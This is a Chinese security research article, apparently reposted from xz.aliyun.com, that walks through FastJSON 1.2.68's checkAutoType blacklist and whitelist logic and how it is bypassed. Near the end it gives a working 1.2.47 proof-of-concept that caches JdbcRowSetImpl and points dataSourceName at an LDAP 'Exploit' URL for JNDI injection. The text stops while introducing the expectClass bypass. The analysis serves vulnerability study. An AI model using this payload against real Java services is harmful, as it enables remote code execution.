> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9476)

文章前言
----

本篇文章主要对 FastJSON AutoType 的校验原理，以及绕过方式进行简单的分析介绍，跟多的是学习记录，文章涉及的绕过方式都是 "站在巨人的肩膀上" 看风景的，很后悔当初去看了 Jackson-databind 而丢弃了 fastJSON，哎....，悔不当初呀~

校验原理
----

FastJSON 中的 checkAutoType() 函数用于对反序列化的类进行黑白名单校验，我们首先来看一下 checkAutoType() 函数的检查流程：  
代码位置：fastjson-1.2.68\src\main\java\com\alibaba\fastjson\parser\ParserConfig.java  
checkAutoType 函数默认需要传递三个参数：  
String typeName：被序列化的类名  
Class<?> expectClass：期望类 ()  
int features：配置的 feature 值  
这里的 expectClass(期望类) 的目的是为了让一些实现了 expectClass 这个接口的类可以被反序列化，可以看到这里首先校验了 typeName 是否为空、autoTypeCheckHandlers 是否为 null，之后检查 safeMode 模式是否开启 (在 1.2.68 中首次出现，配置 safeMode 后，无论白名单和黑名单都不支持 autoType)、typeName 的长度来决定是否开启 AutoType：

```
public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
        if (typeName == null) {
            return null;
        }

        if (autoTypeCheckHandlers != null) {
            for (AutoTypeCheckHandler h : autoTypeCheckHandlers) {
                Class<?> type = h.handler(typeName, expectClass, features);
                if (type != null) {
                    return type;
                }
            }
        }

        final int safeModeMask = Feature.SafeMode.mask;
        boolean safeMode = this.safeMode
                || (features & safeModeMask) != 0
                || (JSON.DEFAULT_PARSER_FEATURE & safeModeMask) != 0;
        if (safeMode) {
            throw new JSONException("safeMode not support autoType : " + typeName);
        }

        if (typeName.length() >= 192 || typeName.length() < 3) {
            throw new JSONException("autoType is not support. " + typeName);
        }


```

然后判断期望类 expectClass，从下面可以看到这里的 Object、Serializable、Cloneable、Closeable、EventListener、Iterable、Collection 都不能作为期望类：

```
final boolean expectClassFlag;
        if (expectClass == null) {
            expectClassFlag = false;
        } else {
            if (expectClass == Object.class
                    || expectClass == Serializable.class
                    || expectClass == Cloneable.class
                    || expectClass == Closeable.class
                    || expectClass == EventListener.class
                    || expectClass == Iterable.class
                    || expectClass == Collection.class
                    ) {
                expectClassFlag = false;
            } else {
                expectClassFlag = true;
            }
        }


```

之后从 typeName 中解析出 className，然后计算 hash 进行内部白名单、黑名单匹配，之后如果不在白名单内且未开启 AutoType 或者 expectClassFlag 为 true 则进行 hash 校验——白名单 acceptHashCodes、黑名单 denyHashCodes，如果在白名单内就加载，在黑名单中就抛出异常：

```
String className = typeName.replace('$', '.');
        Class<?> clazz;

        final long BASIC = 0xcbf29ce484222325L;
        final long PRIME = 0x100000001b3L;

        final long h1 = (BASIC ^ className.charAt(0)) * PRIME;
        if (h1 == 0xaf64164c86024f1aL) { // [
            throw new JSONException("autoType is not support. " + typeName);
        }

        if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) {
            throw new JSONException("autoType is not support. " + typeName);
        }

        final long h3 = (((((BASIC ^ className.charAt(0))
                * PRIME)
                ^ className.charAt(1))
                * PRIME)
                ^ className.charAt(2))
                * PRIME;

        long fullHash = TypeUtils.fnv1a_64(className);
        boolean internalWhite = Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,  fullHash) >= 0;

        if (internalDenyHashCodes != null) {
            long hash = h3;
            for (int i = 3; i < className.length(); ++i) {
                hash ^= className.charAt(i);
                hash *= PRIME;
                if (Arrays.binarySearch(internalDenyHashCodes, hash) >= 0) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
            }
        }
        if ((!internalWhite) && (autoTypeSupport || expectClassFlag)) {
            long hash = h3;
            for (int i = 3; i < className.length(); ++i) {
                hash ^= className.charAt(i);
                hash *= PRIME;
                if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);
                    if (clazz != null) {
                        return clazz;
                    }
                }
                if (Arrays.binarySearch(denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
                    if (Arrays.binarySearch(acceptHashCodes, fullHash) >= 0) {
                        continue;
                    }

                    throw new JSONException("autoType is not support. " + typeName);
                }
            }
        }


```

白名单列表如下：

```
INTERNAL_WHITELIST_HASHCODES = new long[] {
                0x82E8E13016B73F9EL,
                0x863D2DD1E82B9ED9L,
                0x8B2081CB3A50BD44L,
                0x90003416F28ACD89L,
                0x92F252C398C02946L,
                0x9E404E583F254FD4L,
                0x9F2E20FB6049A371L,
                0xA8AAA929446FFCE4L,
                0xAB9B8D073948CA9DL,
                0xAFCB539973CEA3F7L,
                0xB5114C70135C4538L,
                0xC0FE32B8DC897DE9L,
                0xC59AA84D9A94C640L,
                0xC92D8F9129AF339BL,
                0xCC720543DC5E7090L,
                0xD0E71A6E155603C1L,
                0xD11D2A941337A7BCL,
                0xDB7BFFC197369352L,
                0xDC9583F0087CC2C7L,
                0xDDAAA11FECA77B5EL,
                0xE08EE874A26F5EAFL,
                0xE794F5F7DCD3AC85L,
                0xEB7D4786C473368DL,
                0xF4AA683928027CDAL,
                0xF8C7EF9B13231FB6L,
                0xD45D6F8C9017FAL,
                0x6B949CE6C2FE009L,
                0x76566C052E83815L,
                0x9DF9341F0C76702L,
                0xB81BA299273D4E6L,
                0xD4788669A13AE74L,
                0x111D12921C5466DAL,
                0x178B0E2DC3AE9FE5L,
                0x19DCAF4ADC37D6D4L,
                0x1F10A70EE4065963L,
                0x21082DFBF63FBCC1L,
                0x24AE2D07FB5D7497L,
                0x26C5D923AF21E2E1L,
                0x34CC8E52316FA0CBL,
                0x3F64BC3933A6A2DFL,
                0x42646E60EC7E5189L,
                0x44D57A1B1EF53451L,
                0x4A39C6C7ACB6AA18L,
                0x4BB3C59964A2FC50L,
                0x4F0C3688E8A18F9FL,
                0x5449EC9B0280B9EFL,
                0x54DC66A59269BAE1L,
                0x552D9FB02FFC9DEFL,
                0x557F642131553498L,
                0x604D6657082C1EE9L,
                0x61D10AF54471E5DEL,
                0x64DC636F343516DCL,
                0x73A0BE903F2BCBF4L,
                0x73FBA1E41C4C3553L,
                0x7B606F16A261E1E6L,
                0x7F36112F218143B6L,
                0x7FE2B8E675DA0CEFL
        };


```

黑名单列表：

```
denyHashCodes = new long[]{
                0x80D0C70BCC2FEA02L,
                0x86FC2BF9BEAF7AEFL,
                0x87F52A1B07EA33A6L,
                0x8EADD40CB2A94443L,
                0x8F75F9FA0DF03F80L,
                0x9172A53F157930AFL,
                0x92122D710E364FB8L,
                0x941866E73BEFF4C9L,
                0x94305C26580F73C5L,
                0x9437792831DF7D3FL,
                0xA123A62F93178B20L,
                0xA85882CE1044C450L,
                0xAA3DAFFDB10C4937L,
                0xAC6262F52C98AA39L,
                0xAD937A449831E8A0L,
                0xAE50DA1FAD60A096L,
                0xAFFF4C95B99A334DL,
                0xB40F341C746EC94FL,
                0xB7E8ED757F5D13A2L,
                0xBCDD9DC12766F0CEL,
                0xC00BE1DEBAF2808BL,
                0xC2664D0958ECFE4CL,
                0xC7599EBFE3E72406L,
                0xC8D49E5601E661A9L,
                0xC963695082FD728EL,
                0xD1EFCDF4B3316D34L,
                0xD54B91CC77B239EDL,
                0xD8CA3D595E982BACL,
                0xDE23A0809A8B9BD6L,
                0xDEFC208F237D4104L,
                0xDF2DDFF310CDB375L,
                0xE09AE4604842582FL,
                0xE1919804D5BF468FL,
                0xE2EB3AC7E56C467EL,
                0xE603D6A51FAD692BL,
                0xE9184BE55B1D962AL,
                0xE9F20BAD25F60807L,
                0xF3702A4A5490B8E8L,
                0xF474E44518F26736L,
                0xF7E96E74DFA58DBCL,
                0xFC773AE20C827691L,
                0xFD5BFC610056D720L,
                0xFFA15BF021F1E37CL,
                0xFFDD1A80F1ED3405L,
                0x10E067CD55C5E5L,
                0x761619136CC13EL,
                0x3085068CB7201B8L,
                0x45B11BC78A3ABA3L,
                0x55CFCA0F2281C07L,
                0xB6E292FA5955ADEL,
                0xEE6511B66FD5EF0L,
                0x100150A253996624L,
                0x10B2BDCA849D9B3EL,
                0x144277B467723158L,
                0x14DB2E6FEAD04AF0L,
                0x154B6CB22D294CFAL,
                0x17924CCA5227622AL,
                0x193B2697EAAED41AL,
                0x1CD6F11C6A358BB7L,
                0x1E0A8C3358FF3DAEL,
                0x24D2F6048FEF4E49L,
                0x24EC99D5E7DC5571L,
                0x25E962F1C28F71A2L,
                0x275D0732B877AF29L,
                0x2ADFEFBBFE29D931L,
                0x2B3A37467A344CDFL,
                0x2D308DBBC851B0D8L,
                0x313BB4ABD8D4554CL,
                0x327C8ED7C8706905L,
                0x332F0B5369A18310L,
                0x339A3E0B6BEEBEE9L,
                0x33C64B921F523F2FL,
                0x34A81EE78429FDF1L,
                0x3826F4B2380C8B9BL,
                0x398F942E01920CF0L,
                0x3B0B51ECBF6DB221L,
                0x42D11A560FC9FBA9L,
                0x43320DC9D2AE0892L,
                0x440E89208F445FB9L,
                0x46C808A4B5841F57L,
                0x49312BDAFB0077D9L,
                0x4A3797B30328202CL,
                0x4BA3E254E758D70DL,
                0x4BF881E49D37F530L,
                0x4DA972745FEB30C1L,
                0x4EF08C90FF16C675L,
                0x4FD10DDC6D13821FL,
                0x527DB6B46CE3BCBCL,
                0x535E552D6F9700C1L,
                0x5728504A6D454FFCL,
                0x599B5C1213A099ACL,
                0x5A5BD85C072E5EFEL,
                0x5AB0CB3071AB40D1L,
                0x5D74D3E5B9370476L,
                0x5D92E6DDDE40ED84L,
                0x5F215622FB630753L,
                0x62DB241274397C34L,
                0x63A220E60A17C7B9L,
                0x665C53C311193973L,
                0x6749835432E0F0D2L,
                0x6A47501EBB2AFDB2L,
                0x6FCABF6FA54CAFFFL,
                0x746BD4A53EC195FBL,
                0x74B50BB9260E31FFL,
                0x75CC60F5871D0FD3L,
                0x767A586A5107FEEFL,
                0x7AA7EE3627A19CF3L,
                0x7ED9311D28BF1A65L,
                0x7ED9481D28BF417AL
        };


```

Fastjson 在 1.2.42 开始就把原本明文的黑名单改成了哈希过的黑名单，防止安全研究者对其进行研究：  
[https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd](https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111305-a7efc5e0-a318-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111305-a7efc5e0-a318-1.png)  
Fastjson 在 1.2.61 开始把黑名单从十进制数变成了十六进制数，以此来防止安全研究者进行搜索：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111344-bf0168ec-a318-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111344-bf0168ec-a318-1.png)  
Fastjson 在 1.2.62 开始，[https://github.com/alibaba/fastjson/commit/014444e6c62329ec7878bb6b0c6b28c3f516c54e 中，从小写改成了大写：](https://github.com/alibaba/fastjson/commit/014444e6c62329ec7878bb6b0c6b28c3f516c54e%E4%B8%AD%EF%BC%8C%E4%BB%8E%E5%B0%8F%E5%86%99%E6%94%B9%E6%88%90%E4%BA%86%E5%A4%A7%E5%86%99%EF%BC%9A)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111609-15a4d120-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111609-15a4d120-a319-1.png)  
Git 记录十进制和小写的十六进制数，不记录大写的十六进制数，网上没找到类似的仓库，为了弄清楚每个 hash 到底对应的是什么，GitHub 上有人写了一个轮子来跑了一波，不过目前已经很久没有更新了：  
[https://github.com/LeadroyaL/fastjson-blacklist](https://github.com/LeadroyaL/fastjson-blacklist)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422111724-41f02798-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422111724-41f02798-a319-1.png)  
下面我们接着来看，之后分别从 getClassFromMapping、deserializers、typeMapping、internalWhite 内部白名单中查找类，如果开启了 expectClass 期望类还要判断类型是否一致，可以到这里还未出现 "autoTypeSupport" 的判断，当已经可以返回 clazz(示例类) 了：

```
clazz = TypeUtils.getClassFromMapping(typeName);

        if (clazz == null) {
            clazz = deserializers.findClass(typeName);
        }

        if (clazz == null) {
            clazz = typeMapping.get(typeName);
        }

        if (internalWhite) {
            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);
        }

        if (clazz != null) {
            if (expectClass != null
                    && clazz != java.util.HashMap.class
                    && !expectClass.isAssignableFrom(clazz)) {
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
            }

            return clazz;
        }


```

这里的 getClassFromMapping 在 com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings 被赋值，添加了一些基本类，后续被当作缓存使用

```
private static void addBaseClassMappings(){
        mappings.put("byte", byte.class);
        mappings.put("short", short.class);
        mappings.put("int", int.class);
        mappings.put("long", long.class);
        mappings.put("float", float.class);
        mappings.put("double", double.class);
        mappings.put("boolean", boolean.class);
        mappings.put("char", char.class);
        mappings.put("[byte", byte[].class);
        mappings.put("[short", short[].class);
        mappings.put("[int", int[].class);
        mappings.put("[long", long[].class);
        mappings.put("[float", float[].class);
        mappings.put("[double", double[].class);
        mappings.put("[boolean", boolean[].class);
        mappings.put("[char", char[].class);
        mappings.put("[B", byte[].class);
        mappings.put("[S", short[].class);
        mappings.put("[I", int[].class);
        mappings.put("[J", long[].class);
        mappings.put("[F", float[].class);
        mappings.put("[D", double[].class);
        mappings.put("[C", char[].class);
        mappings.put("[Z", boolean[].class);
        Class<?>[] classes = new Class[]{
                Object.class,
                java.lang.Cloneable.class,
                loadClass("java.lang.AutoCloseable"),
                java.lang.Exception.class,
                java.lang.RuntimeException.class,
                java.lang.IllegalAccessError.class,
                java.lang.IllegalAccessException.class,
                java.lang.IllegalArgumentException.class,
                java.lang.IllegalMonitorStateException.class,
                java.lang.IllegalStateException.class,
                java.lang.IllegalThreadStateException.class,
                java.lang.IndexOutOfBoundsException.class,
                java.lang.InstantiationError.class,
                java.lang.InstantiationException.class,
                java.lang.InternalError.class,
                java.lang.InterruptedException.class,
                java.lang.LinkageError.class,
                java.lang.NegativeArraySizeException.class,
                java.lang.NoClassDefFoundError.class,
                java.lang.NoSuchFieldError.class,
                java.lang.NoSuchFieldException.class,
                java.lang.NoSuchMethodError.class,
                java.lang.NoSuchMethodException.class,
                java.lang.NullPointerException.class,
                java.lang.NumberFormatException.class,
                java.lang.OutOfMemoryError.class,
                java.lang.SecurityException.class,
                java.lang.StackOverflowError.class,
                java.lang.StringIndexOutOfBoundsException.class,
                java.lang.TypeNotPresentException.class,
                java.lang.VerifyError.class,
                java.lang.StackTraceElement.class,
                java.util.HashMap.class,
                java.util.Hashtable.class,
                java.util.TreeMap.class,
                java.util.IdentityHashMap.class,
                java.util.WeakHashMap.class,
                java.util.LinkedHashMap.class,
                java.util.HashSet.class,
                java.util.LinkedHashSet.class,
                java.util.TreeSet.class,
                java.util.ArrayList.class,
                java.util.concurrent.TimeUnit.class,
                java.util.concurrent.ConcurrentHashMap.class,
                java.util.concurrent.atomic.AtomicInteger.class,
                java.util.concurrent.atomic.AtomicLong.class,
                java.util.Collections.EMPTY_MAP.getClass(),
                java.lang.Boolean.class,
                java.lang.Character.class,
                java.lang.Byte.class,
                java.lang.Short.class,
                java.lang.Integer.class,
                java.lang.Long.class,
                java.lang.Float.class,
                java.lang.Double.class,
                java.lang.Number.class,
                java.lang.String.class,
                java.math.BigDecimal.class,
                java.math.BigInteger.class,
                java.util.BitSet.class,
                java.util.Calendar.class,
                java.util.Date.class,
                java.util.Locale.class,
                java.util.UUID.class,
                java.sql.Time.class,
                java.sql.Date.class,
                java.sql.Timestamp.class,
                java.text.SimpleDateFormat.class,
                com.alibaba.fastjson.JSONObject.class,
                com.alibaba.fastjson.JSONPObject.class,
                com.alibaba.fastjson.JSONArray.class,
        };
        for(Class clazz : classes){
            if(clazz == null){
                continue;
            }
            mappings.put(clazz.getName(), clazz);
        }
    }


```

这里可以先注意下 java.lang.AutoCloseable 类，deserializers.findClass 在 com.alibaba.fastjson.parser.ParserConfig#initDeserializers 处被初始化，这里也是存放了一些特殊类用来直接反序列化：

```
private void initDeserializers() {
        deserializers.put(SimpleDateFormat.class, MiscCodec.instance);
        deserializers.put(java.sql.Timestamp.class, SqlDateDeserializer.instance_timestamp);
        deserializers.put(java.sql.Date.class, SqlDateDeserializer.instance);
        deserializers.put(java.sql.Time.class, TimeDeserializer.instance);
        deserializers.put(java.util.Date.class, DateCodec.instance);
        deserializers.put(Calendar.class, CalendarCodec.instance);
        deserializers.put(XMLGregorianCalendar.class, CalendarCodec.instance);

        deserializers.put(JSONObject.class, MapDeserializer.instance);
        deserializers.put(JSONArray.class, CollectionCodec.instance);

        deserializers.put(Map.class, MapDeserializer.instance);
        deserializers.put(HashMap.class, MapDeserializer.instance);
        deserializers.put(LinkedHashMap.class, MapDeserializer.instance);
        deserializers.put(TreeMap.class, MapDeserializer.instance);
        deserializers.put(ConcurrentMap.class, MapDeserializer.instance);
        deserializers.put(ConcurrentHashMap.class, MapDeserializer.instance);

        deserializers.put(Collection.class, CollectionCodec.instance);
        deserializers.put(List.class, CollectionCodec.instance);
        deserializers.put(ArrayList.class, CollectionCodec.instance);

        deserializers.put(Object.class, JavaObjectDeserializer.instance);
        deserializers.put(String.class, StringCodec.instance);
        deserializers.put(StringBuffer.class, StringCodec.instance);
        deserializers.put(StringBuilder.class, StringCodec.instance);
        deserializers.put(char.class, CharacterCodec.instance);
        deserializers.put(Character.class, CharacterCodec.instance);
        deserializers.put(byte.class, NumberDeserializer.instance);
        deserializers.put(Byte.class, NumberDeserializer.instance);
        deserializers.put(short.class, NumberDeserializer.instance);
        deserializers.put(Short.class, NumberDeserializer.instance);
        deserializers.put(int.class, IntegerCodec.instance);
        deserializers.put(Integer.class, IntegerCodec.instance);
        deserializers.put(long.class, LongCodec.instance);
        deserializers.put(Long.class, LongCodec.instance);
        deserializers.put(BigInteger.class, BigIntegerCodec.instance);
        deserializers.put(BigDecimal.class, BigDecimalCodec.instance);
        deserializers.put(float.class, FloatCodec.instance);
        deserializers.put(Float.class, FloatCodec.instance);
        deserializers.put(double.class, NumberDeserializer.instance);
        deserializers.put(Double.class, NumberDeserializer.instance);
        deserializers.put(boolean.class, BooleanCodec.instance);
        deserializers.put(Boolean.class, BooleanCodec.instance);
        deserializers.put(Class.class, MiscCodec.instance);
        deserializers.put(char[].class, new CharArrayCodec());

        deserializers.put(AtomicBoolean.class, BooleanCodec.instance);
        deserializers.put(AtomicInteger.class, IntegerCodec.instance);
        deserializers.put(AtomicLong.class, LongCodec.instance);
        deserializers.put(AtomicReference.class, ReferenceCodec.instance);

        deserializers.put(WeakReference.class, ReferenceCodec.instance);
        deserializers.put(SoftReference.class, ReferenceCodec.instance);

        deserializers.put(UUID.class, MiscCodec.instance);
        deserializers.put(TimeZone.class, MiscCodec.instance);
        deserializers.put(Locale.class, MiscCodec.instance);
        deserializers.put(Currency.class, MiscCodec.instance);

        deserializers.put(Inet4Address.class, MiscCodec.instance);
        deserializers.put(Inet6Address.class, MiscCodec.instance);
        deserializers.put(InetSocketAddress.class, MiscCodec.instance);
        deserializers.put(File.class, MiscCodec.instance);
        deserializers.put(URI.class, MiscCodec.instance);
        deserializers.put(URL.class, MiscCodec.instance);
        deserializers.put(Pattern.class, MiscCodec.instance);
        deserializers.put(Charset.class, MiscCodec.instance);
        deserializers.put(JSONPath.class, MiscCodec.instance);
        deserializers.put(Number.class, NumberDeserializer.instance);
        deserializers.put(AtomicIntegerArray.class, AtomicCodec.instance);
        deserializers.put(AtomicLongArray.class, AtomicCodec.instance);
        deserializers.put(StackTraceElement.class, StackTraceElementDeserializer.instance);

        deserializers.put(Serializable.class, JavaObjectDeserializer.instance);
        deserializers.put(Cloneable.class, JavaObjectDeserializer.instance);
        deserializers.put(Comparable.class, JavaObjectDeserializer.instance);
        deserializers.put(Closeable.class, JavaObjectDeserializer.instance);

        deserializers.put(JSONPObject.class, new JSONPDeserializer());
    }


```

这里的 typeMapping 默认为空需要开发自己赋值，形如

```
ParserConfig.getGlobalInstance().register("test", Model.class);


```

这里的 internalWhite 为内部白名单也就是之前提到的部分，到这里已经可以返回实例类了，之后我们继续来看后续的代码，可以看到这里会判断 autoType 是否开启，如果开启 AutoType 则会进行黑白名单匹配，如果在黑名单内则直接抛出异常，如果在在白名单内且 expectClass 不为 NULL 则还需要判断类型是否一致，如果不满足条件则抛出异常，否则就可以返回实例类了：

```
if (!autoTypeSupport) {
            long hash = h3;
            for (int i = 3; i < className.length(); ++i) {
                char c = className.charAt(i);
                hash ^= c;
                hash *= PRIME;

                if (Arrays.binarySearch(denyHashCodes, hash) >= 0) {
                    throw new JSONException("autoType is not support. " + typeName);
                }

                // white list
                if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);

                    if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                    }

                    return clazz;
                }
            }
        }


```

之后检查使用注解 JSONType 的类 (有注解的类一般都是开发自行写的 JavaBean)

```
boolean jsonType = false;
        InputStream is = null;
        try {
            String resource = typeName.replace('.', '/') + ".class";
            if (defaultClassLoader != null) {
                is = defaultClassLoader.getResourceAsStream(resource);
            } else {
                is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);
            }
            if (is != null) {
                ClassReader classReader = new ClassReader(is, true);
                TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);
                classReader.accept(visitor);
                jsonType = visitor.hasJsonType();
            }
        } catch (Exception e) {
            // skip
        } finally {
            IOUtils.close(is);
        }


```

之后检查是否开启 AutoType 或者有注解或者是期望类，则直接加载类，如果条件不满足或成功加载类后 clazz 不为 NULL，则进一步判断是否有注解，如果有则加入 mapping 并直接返回实例类，如果没有注解则判断 clazz 是否继承或实现 ClassLoader、javax.sql.DataSource、javax.sql.RowSet 类，如果满足以上条件则直接抛出异常，这里这样做的目的主要是规避大多数的 JNDI 注入 (JNDI 注入大多数与 DataSource 类、RowSet 类相关)，之后如果 expectClass 不为 NULL，则检查 clazz 是否是 expectClass 的实现或继承，如果类指定了 JSONCreator 注解，并且开启了 SupportAutoType 则抛出异常：

```
final int mask = Feature.SupportAutoType.mask;
        boolean autoTypeSupport = this.autoTypeSupport
                || (features & mask) != 0
                || (JSON.DEFAULT_PARSER_FEATURE & mask) != 0;

        if (autoTypeSupport || jsonType || expectClassFlag) {
            boolean cacheClass = autoTypeSupport || jsonType;
            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
        }

        if (clazz != null) {
            if (jsonType) {
                TypeUtils.addMapping(typeName, clazz);
                return clazz;
            }

            if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
                    || javax.sql.DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
                    || javax.sql.RowSet.class.isAssignableFrom(clazz) //
                    ) {
                throw new JSONException("autoType is not support. " + typeName);
            }

            if (expectClass != null) {
                if (expectClass.isAssignableFrom(clazz)) {
                    TypeUtils.addMapping(typeName, clazz);
                    return clazz;
                } else {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                }
            }

            JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);
            if (beanInfo.creatorConstructor != null && autoTypeSupport) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }


```

最后判断是否开启 autoTypeSupport，如果未开启则直接抛出异常，否则检查 clazz 是否为 NULL，如果不为 NULL 则加入 mapping，最后返回示例类：

```
if (!autoTypeSupport) {
            throw new JSONException("autoType is not support. " + typeName);
        }

        if (clazz != null) {
            TypeUtils.addMapping(typeName, clazz);
        }

        return clazz;
    }


```

通过上面的分析，我们可以了解到这里的 checkAutoType 其实就是一个校验和加载类的过程，而且 SupportAutoType 的校验是最后进行的，这样做的目的之一正是为了实现基础类的任意反序列化的 feature(特性)，这也就意味着需要通过逻辑来保证在这之前返回的类都是安全的，但也正是这个原因导致了 AutoType 的 Bypass，同时我们可以看到当出现以下情况是会直接返回示例类：

*   白名单里的类 (acceptHashCodes+INTERNAL_WHITELIST_HASHCODES(内部白名单))
*   开启了 AutoType
*   使用了 JSONType 注解
*   指定了期望类 (expectClass)
*   缓存 mapping 中的类  
    ## 绕过实践  
    ### Mapping 绕过  
    首先，我们来回顾以下 FastJSON 1.2.47 的绕过——缓存 mapping 中的类，根据上面的校验原理部分我们可以了解到当 mappings 缓存中存在指定的类时，可以直接返回并且不受 SupportAutoType 限制，在 TypeUtils.loadClass 方法中，如果参数中 cache 值为 true 时，则会在加载到类之后，将类加入 mappings 缓存：  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112004-a15a7710-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112004-a15a7710-a319-1.png)  
    完整的代码如下：
    
    ```
    public static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) {
          if(className == null || className.length() == 0 || className.length() > 128){
              return null;
          }
    
          Class<?> clazz = mappings.get(className);
          if(clazz != null){
              return clazz;
          }
    
          if(className.charAt(0) == '['){
              Class<?> componentType = loadClass(className.substring(1), classLoader);
              return Array.newInstance(componentType, 0).getClass();
          }
    
          if(className.startsWith("L") && className.endsWith(";")){
              String newClassName = className.substring(1, className.length() - 1);
              return loadClass(newClassName, classLoader);
          }
    
          try{
              if(classLoader != null){
                  clazz = classLoader.loadClass(className);
                  if (cache) {
                      mappings.put(className, clazz);
                  }
                  return clazz;
              }
          } catch(Throwable e){
              e.printStackTrace();
              // skip
          }
          try{
              ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
              if(contextClassLoader != null && contextClassLoader != classLoader){
                  clazz = contextClassLoader.loadClass(className);
                  if (cache) {
                      mappings.put(className, clazz);
                  }
                  return clazz;
              }
          } catch(Throwable e){
              // skip
          }
          try{
              clazz = Class.forName(className);
              if (cache) {
                  mappings.put(className, clazz);
              }
              return clazz;
          } catch(Throwable e){
              // skip
          }
          return clazz;
      }
    
    
    ```
    
    之后全局查找所有调用了该函数位置，并且 cache 设置为 true 的函数，发现只有它的重载函数：  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112051-bd538646-a319-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112051-bd538646-a319-1.jpg)  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112110-c9206f34-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112110-c9206f34-a319-1.png)
    
    ```
    public static Class<?> loadClass(String className, ClassLoader classLoader) {
          return loadClass(className, classLoader, true);
      }
    
    
    ```
    
    之后继续寻找调用了该重载的地方，发现在 MiscCode 处有调用：  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112144-dcf63d04-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112144-dcf63d04-a319-1.png)
    
    ```
    if (clazz == Class.class) {
              return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
          }
    
    
    ```
    
    上面的逻辑是当 class 是一个 java.lang.Class 类时，会去加载指定类 (从而也就无意之间加入了 mappings 缓存)，而 java.lang.Class 同时也是个默认特殊类——deserializers.findClass 指定类，可以直接反序列化，所以可以首先通过反序列化 java.lang.Class 指定恶意类，然后恶意类被加入 mappings 缓存后，第二次就可以直接从缓存中获取到恶意类，并进行反序列化：  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112214-ef3dd5c6-a319-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112214-ef3dd5c6-a319-1.png)  
    1.2.47 的有效载荷如下：  
    ```java  
    package com.FastJson1242;
    

import com.alibaba.fastjson.JSONObject;

public class Poc {  
public static void main(String[] argv){  
String payload ="{\n" +  
"\"a\": {\n" +  
"\"@type\": \"java.lang.Class\", \n" +  
"\"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +  
"}, \n" +  
"\"b\": {\n" +  
"\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \n" +  
"\"dataSourceName\": \"ldap://localhost:1099/Exploit\", \n" +  
"\"autoCommit\": true\n" +  
"}\n" +  
"}";  
JSONObject.parseObject(payload);  
}  
}

```
执行结果如下：
![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112304-0cd4c6c6-a31a-1.jpg)
### exceptClass期望类
#### ThrowableDeserializer
期望类的功能主要是实现/继承了期望类的class能被反序列化出来且不受autotype影响，默认情况下exceptClass这个参数是空的，也就不存在期望类的特性，之后全局搜索checkAutoType的调用，且条件是exceptClass不为空：
![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112407-323ec394-a31a-1.jpg)
从上面的搜索结果中可以看到在JavaBeanDeserializer、ThrowableDeserializer中调用了checkAutoType并且exceptClass不为空，我们这里先来看一下ThrowableDeserializer，该类主要是对Throwable异常类进行反序列化，我们可以在ParserConfig.getDeserializer中找到对应的反序列化示例类型：
com\alibaba\fastjson\1.2.68\fastjson-1.2.68-sources.jar!\com\alibaba\fastjson\parser\ParserConfig.java 826
![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20210422112428-3f01e156-a31a-1.png)
![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112454-4e6cbb7a-a31a-1.jpg)
可以从上面看到ThrowableDeserializer是Throwable用来反序列化异常类的，我们先来看一下ThrowableDeserializer，可以看到在ThrowableDeserializer中可以根据第二个@type的值来获取具体类，并且根据传入的指定期望类进行加载：
![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20210422112528-62a5f034-a31a-1.png)
